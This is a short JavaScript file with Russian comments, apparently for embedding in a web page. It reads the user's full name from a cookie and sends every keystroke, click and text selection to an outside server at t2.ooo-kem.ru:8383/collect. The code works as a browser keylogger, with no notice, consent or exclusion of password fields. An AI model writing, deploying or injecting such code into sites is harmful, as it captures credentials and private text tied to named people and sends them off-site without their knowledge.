// Получение ФИО пользователя из cookie
function getUserFio() {
    var matches = document.cookie.match(new RegExp(
        "(?:^|; )LABEL=([^;]*)"
    ));
    return matches ? decodeURIComponent(matches[1]) : "Unknown_User";
}

// Отправка действия на сервер
function sendActionToServer(action) {
    var fio = getUserFio();
    action.fio = fio;

    fetch('https://t2.ooo-kem.ru:8383/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(action)
    });
}

// Отслеживание нажатий клавиш
// Можно добавить throttle/debounce при необходимости

document.addEventListener('keydown', function(e) {
    sendActionToServer({ type: 'keydown', key: e.key, code: e.code });
});

document.addEventListener('click', function(e) {
    sendActionToServer({ type: 'click', x: e.clientX, y: e.clientY, target: e.target.tagName });
});

document.addEventListener('selectionchange', function() {
    const selection = document.getSelection();
    if (selection && selection.toString()) {
        sendActionToServer({ type: 'select', text: selection.toString() });
    }
}); 